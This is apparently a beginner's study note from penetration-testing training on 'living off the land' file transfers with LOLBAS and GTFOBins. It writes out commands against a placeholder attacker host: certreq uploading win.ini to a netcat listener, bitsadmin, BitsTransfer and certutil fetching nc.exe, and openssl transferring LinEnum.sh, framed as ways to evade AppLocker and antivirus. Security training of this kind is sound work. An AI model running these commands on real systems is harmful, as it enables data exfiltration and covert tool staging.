---
tags: [module/file-transfers, lolbas, gtfobins, living-off-the-land, windows, linux, level/beginner]
---

# Living Off The Land - Beginner's Guide

## What is "Living Off the Land"?

The phrase "Living off the land" was coined by Christopher Campbell (@obscuresec) and Matt Graeber (@mattifestation) at DerbyCon 3.

It means using tools that already exist on a system to accomplish your goals, rather than uploading your own tools.

**The Rule:** Why upload a tool when the system already has one that works?

---

## LOLBAS and GTFOBins

| Project | Purpose | URL |
|---------|---------|-----|
| LOLBAS | Windows binaries | https://lolbas-project.github.io/ |
| GTFOBins | Linux binaries | https://gtfobins.github.io/ |

These websites catalog binaries that can be used for:
- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses

---

## Why Use Living Off the Land Binaries?

| Advantage | Why It Matters |
|-----------|----------------|
| No upload needed | Tools already exist |
| Less suspicious | Native tools look normal |
| Bypass AppLocker | Trusted binaries aren't blocked |
| Bypass AV | Less likely to be flagged |
| Works in restricted environments | When you can't upload anything |

---

## LOLBAS for Windows

### Finding LOLBAS

Go to https://lolbas-project.github.io/ and search for functions like:
- download
- upload
- filewrite

### Example: CertReq.exe

CertReq.exe is a Windows binary for certificate requests, but it can also upload files.

**Upload a file using CertReq.exe:**

On target (Windows):
certreq.exe -Post -config http://YOUR-IP:8000/ c:\windows\win.ini

On your machine (Linux):
nc -lvnp 8000

You'll receive the file contents in your Netcat session.

**Note:** If you get an error, your version may not have the `-Post` parameter. Download an updated version.

---

## GTFOBins for Linux

### Finding GTFOBins

Go to https://gtfobins.github.io/ and search for:
- file download
- file upload

### Example: OpenSSL

OpenSSL is installed on most Linux systems and can be used for file transfers.

**Step 1: Create a certificate on your machine**

openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

**Step 2: Start the server (sending a file)**

openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

**Step 3: Download from the target**

openssl s_client -connect YOUR-IP:80 -quiet > LinEnum.sh

---

## Other Common Windows Tools

### Bitsadmin

Bitsadmin (Background Intelligent Transfer Service) is built into Windows for downloading files.

bitsadmin /transfer wcb /priority foreground http://YOUR-IP:8000/nc.exe C:\Users\Public\nc.exe

### PowerShell BitsTransfer

PowerShell can also use BITS:

Import-Module bitstransfer
Start-BitsTransfer -Source "http://YOUR-IP:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"

### Certutil

Certutil is the "wget for Windows" - it's everywhere.

certutil.exe -verifyctl -split -f http://YOUR-IP:8000/nc.exe

**Warning:** AMSI (Antimalware Scan Interface) now detects this as malicious, so it may be monitored.

---

## Why Practice These?

> "The more obscure, the better. You never know when you'll need one of these binaries during an assessment, and it'll save time if you already have detailed notes on multiple options."

- Some binaries may surprise you
- Different environments have different tools
- When one method fails, another works
- Native tools look less suspicious

---

## Key Takeaways

- Living off the land = using existing system tools
- LOLBAS = Windows binaries
- GTFOBins = Linux binaries
- CertReq.exe can upload files
- OpenSSL can transfer files
- Bitsadmin downloads files
- Certutil is the classic Windows downloader
- Native tools bypass many restrictions
- Practice with multiple binaries
- The more you know, the less likely you'll get stuck
- AMSI may detect some methods (like certutil)
- Always have alternatives ready
